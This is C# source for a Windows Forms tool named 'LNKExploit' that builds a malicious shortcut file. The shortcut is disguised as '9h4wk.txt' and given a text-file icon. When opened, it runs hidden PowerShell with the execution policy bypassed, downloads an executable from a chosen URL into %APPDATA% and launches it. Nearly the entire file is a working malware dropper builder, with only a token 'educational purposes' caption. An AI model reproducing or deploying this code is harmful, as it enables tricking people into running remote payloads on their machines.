using Microsoft.VisualBasic;
using IWshRuntimeLibrary;

namespace LNKExploit
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            this.txtBoxUrl.Text = "http://127.0.0.1:8000/TestPE.exe";
        }


        private void button1_Click(object sender, EventArgs e)
        {
            CreateShortcut(Application.StartupPath + "\\9h4wk.txt.lnk", this.txtBoxUrl.Text);
            Interaction.MsgBox("Exploit created !! \nMade with love with The Carbon Coder \nFile has been save to : " + Application.StartupPath + "\\9h4wk.txt.lnk", MsgBoxStyle.Information, "Use for Educational purposes");
        }

        public static void CreateShortcut(string shortcutPath, string url, string workingDirectory = null, string description = null)
        {
            // Create a new WshShellClass instance
            WshShell shell = new WshShell();

            // Create the shortcut object
            IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutPath);
            Uri uri = new Uri(url);
            string fileName = System.IO.Path.GetFileName(uri.LocalPath);

            string arguments = string.Concat(new string[]
                {
                    "-ExecutionPolicy bypass -noprofile -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('",
                    url,
                    "','%APPDATA%\\",
                    Strings.Trim(fileName),
                    "');Start-Process '%APPDATA%\\",
                    Strings.Trim(fileName),
                    "'"
                });

            // Set the properties of the shortcut object
            shortcut.TargetPath = "powershell";
            shortcut.Arguments = arguments ?? "";
            shortcut.WorkingDirectory = workingDirectory ?? "";
            shortcut.Description = description ?? "";
            shortcut.IconLocation = @"C:\Windows\System32\imageres.dll,97";
            shortcut.WindowStyle = 7;

            // Save the shortcut
            shortcut.Save();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            LNKAnalysis analysis = new LNKAnalysis();
            //this.Hide();
            analysis.Show();
            //this.Close();
        }
    }
}